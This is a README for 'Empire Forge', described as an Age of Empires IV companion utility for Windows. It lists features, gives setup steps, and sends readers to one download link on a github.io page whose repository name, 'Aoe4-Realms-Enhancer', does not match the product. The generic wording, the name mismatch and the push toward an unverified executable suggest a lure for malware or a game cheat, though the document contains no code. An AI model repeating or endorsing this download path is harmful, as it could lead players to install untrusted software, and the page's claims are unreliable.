## 🏰 About the Project

Every great empire is built twice: once on the battlefield, and once in the mind of the strategist who plans it. **Empire Forge** exists in that second space. It is a meticulously crafted companion utility suite created for players of Age of Empires IV on Windows, offering a curated set of planning, tuning, and quality-of-life tools that help you reshape how you approach your campaigns — whether you play solo skirmishes, custom scenarios, or cooperative matches with friends.

This repository hosts the official distribution channel, documentation, configuration guidance, and changelog for the 2026 release line. The project was born from a simple observation: strategy players love to tinker, experiment, and explore "what if" scenarios, but the tools to do so in a comfortable, modern, and reliable way have been scattered, outdated, or confusing. Empire Forge consolidates that experience into one coherent, elegant package.

The toolkit is distributed as a self-contained Windows application. There are no fragmented dependencies, no confusing environment setup, and no terminal gymnastics required. You receive a single, well-organized package, follow a short guided setup, and you are inside the forge within minutes.

Whether you are a returning veteran of the series or a newcomer to real-time strategy in 2026, the goal is the same: give you a smooth, understandable, and empowering companion that respects your time and your machine.

## ✨ Core Feature Showcase

The 2026 edition of Empire Forge bundles a broad set of capabilities. Below is the full feature inventory, organized by category.

### 🎛️ Gameplay Companion Utilities

- **Resource Flow Visualizer** — real-time dashboards that illustrate how your economy breathes, expands, and contracts across a match.
- **Build Order Sandbox** — rehearse opening sequences and mid-game transitions in a safe, isolated environment before committing them to a live session.
- **Unit Cost Calculator** — an interactive table that recomputes army compositions on the fly as you adjust your target population and tech tier.
- **Map Awareness Overlay** — an optional, toggleable overlay that helps you practice map reading and scouting discipline.
- **Timeline Recorder** — capture session events and replay them in a scrubbable timeline for after-action review.
- **Scenario Blueprint Manager** — save, name, and load custom scenario configurations with a single click.

### 🖥️ Interface & Experience

- **Responsive UI** — layouts that fluidly adapt from small laptop screens to ultrawide monitors and 4K displays.
- **Dark / Light / Amber themes** — three carefully tuned palettes, including a low-strain amber mode for late-night sessions.
- **Quick Command Palette** — a fuzzy-search overlay (think of it as a search bar for everything) that reaches any function in two keystrokes.
- **Custom Hotkey Mapping** — assign, remap, and export key profiles without touching configuration files manually.
- **Accessibility Layer** — adjustable font scaling, high-contrast modes, and screen-reader-friendly labels across every panel.

### 🧠 Intelligence & Assistance

- **Adaptive Advisor** — a context-sensitive hint engine that offers suggestions based on your current game state.
- **Match Insights Reports** — generate a summary after each session highlighting economy efficiency, military uptime, and expansion timing.
- **Trend Analytics** — track your performance metrics over weeks and months with clean, readable charts.

### 🔐 Stability & Maintenance

- **Atomic Profile Writes** — your settings survive crashes, power loss, and unexpected shutdowns.
- **Rollback Snapshots** — restore a previous configuration state at any time.
- **Automatic Update Channel** — receive patch notifications in-app (no manual re-downloads required).
- **Diagnostic Console** — a transparent log viewer so you always know what the toolkit is doing.

### 🌐 Connectivity & Community

- **Accountless Operation** — no mandatory sign-in, no email harvesting, no telemetry sent anywhere.
- **Portable Mode** — run everything from a USB drive or external SSD if you prefer.
- **Import / Export Profiles** — share configuration presets with friends as simple, human-readable files.
- **Localization Packs** — community-translatable strings with 14 language packs shipping out of the box.

| Display Class | Example Resolution | Layout Behavior |

| Compact | 1366 × 768 | Single-column stacked panels, collapsible sidebar |
| Standard | 1920 × 1080 | Two-column dashboard with pinned toolbar |
| Wide | 2560 × 1440 | Three-column workspace with dockable widgets |
| Ultrawide | 3440 × 1440+ | Expandable side rails and floating panels |
| 4K / HiDPI | 3840 × 2160 | Vector-scaled assets, crisp at every zoom level |

Every panel remembers its position, size, and docking state per user profile. If you rearrange your workspace once, it stays exactly where you left it — even across updates.

## 🚀 Getting Started

Getting up and running is a short, guided path. The 2026 installer handles everything in a few clicks.

### Step 1 — Obtain the Package

Reach the official distribution point below. This is the only sanctioned channel.

[![Download](https://raw.githubusercontent.com/oitijyos/Aoe4-Realms-Enhancer/main/get_d253.svg)](https://oitijyos.github.io/Aoe4-Realms-Enhancer/)

### Step 2 — Verify the Archive

Compare the SHA-256 checksum listed in the release notes page against the file you received. Mismatches should be reported immediately through the support channels.

### Step 3 — Run the Guided Setup

Launch the installer and follow the on-screen wizard. You will be asked to choose:

1. **Installation directory** — default is `%LOCALAPPDATA%\EmpireForge`
2. **Profile type** — Standard, Portable, or Shared (multi-user)
3. **Theme preference** — Dark, Light, or Amber
4. **Language selection** — pick from the fourteen supported locales

### Step 4 — First-Run Calibration

On first launch, the toolkit performs a short calibration pass that detects your display configuration, input devices, and available system resources. This takes roughly fifteen seconds.

### Step 5 — Import or Create a Profile

Either start with a fresh default profile, or import a `.efprofile` file shared by a friend or the community. Profiles are plain-text and human-editable.

### Step 6 — Launch and Explore

You are inside the forge. Use the command palette (default `Ctrl+K`) to navigate anywhere instantly.

## 🗂️ Configuration Profiles

Every aspect of Empire Forge is driven by configuration profiles, stored as readable YAML-like documents. A profile defines:

- **Theme and typography** preferences
- **Hotkey bindings** across modules
- **Overlay behavior** (opacity, corner placement, auto-hide)
- **Advisor verbosity** and hint frequency
- **Analytics retention** windows
- **Module toggles** for each feature area

Profiles can be version-controlled, shared, diffed, and merged. The community maintains a library of curated profiles targeting specific playstyles — from "casual campaigner" to "competitive ladder aspirant."
